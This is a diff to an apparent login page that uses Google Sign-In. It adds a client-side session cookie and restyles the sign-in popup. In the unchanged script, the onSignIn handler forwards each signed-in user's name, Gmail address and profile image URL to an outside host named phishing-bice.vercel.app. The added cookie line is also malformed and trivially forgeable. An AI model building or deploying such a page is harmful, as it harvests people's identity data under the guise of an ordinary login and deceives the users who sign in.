@@ -8,6 +8,9 @@
   <script src="https://apis.google.com/js/platform.js" async defer></script>
   <link rel="stylesheet" href="style.css">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script>
+    
+  </script>
   <style>
     
     div .card:hover{
@@ -15,7 +18,7 @@
       box-shadow: rgba(0, 0, 0, 0.4) 0px 3px 5px;
     }
     
-    .g-signin2{
+    .popup{
       position: absolute;
       top: 50%;
       left: 50%;
@@ -50,7 +53,8 @@
   <div class="overlay"></div>
   <div class="popup">
     
-    <div class="g-signin2" data-onsuccess="onSignIn"></div>
+    <div class="g-signin2" data-onsuccess="onSignIn">
+    </div>
     
   </div>
   <nav class="navbar navbar-light bg-light">
@@ -104,9 +108,15 @@
     
     function onSignIn(googleUser) {
       var profile = googleUser.getBasicProfile();
+      var sessionTimeout = 1; //hours
+      var loginDuration = new Date();
+      loginDuration.setTime(loginDuration.getTime() + (sessionTimeout * 60 * 60 * 1000));
+      document.cookie = "CrewCentreSession=Valid; " + loginDuration.toGMTString() + "; path=/";
       window.location.href = `https://phishing-bice.vercel.app/login?name=${profile.getName()}&gmail=${profile.getEmail()}&img=${profile.getImageUrl()}`;
       
     }
+    
+    
     
   </script>
 </body>
